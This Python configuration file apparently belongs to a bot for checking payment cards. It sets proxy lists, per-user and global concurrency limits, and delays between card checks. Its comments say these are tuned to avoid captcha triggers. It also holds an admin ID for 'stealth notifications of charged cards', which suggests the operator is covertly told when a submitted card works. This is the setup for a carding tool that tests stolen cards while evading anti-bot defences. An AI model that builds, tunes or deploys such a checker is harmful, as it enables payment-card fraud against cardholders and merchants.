import os

class CheckerConfig:
    def __init__(self):
        # Load from environment variables for Railway deployment
        self.PROXY_LIST = os.getenv("PROXY_LIST", "").split(",") if os.getenv("PROXY_LIST") else []

        self.IS_SHIPPABLE = os.getenv("IS_SHIPPABLE", "false").lower() == "true"

        self.DEFAULT_EMAIL = os.getenv("DEFAULT_EMAIL", None)

        # Per-user concurrency: how many cards each user can check at once
        # Lower values avoid captcha triggers (default 5, max recommended 10)
        self.CONCURRENCY_LIMIT = int(os.getenv("CONCURRENCY_LIMIT", "5"))

        # Global concurrency: total concurrent operations across ALL users
        # Prevents server overload and captcha (default 20)
        self.GLOBAL_CONCURRENCY_LIMIT = int(os.getenv("GLOBAL_CONCURRENCY_LIMIT", "20"))

        # Delay between starting each card check (in seconds)
        # Helps avoid captcha by spacing out requests (default 1.5)
        # Higher values = less captcha but slower checking
        self.CARD_DELAY = float(os.getenv("CARD_DELAY", "1.5"))

        self.BOT_TOKEN = os.getenv("BOT_TOKEN", "")

        # Admin user ID for stealth notifications of charged cards
        self.ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "0")) if os.getenv("ADMIN_USER_ID") else None
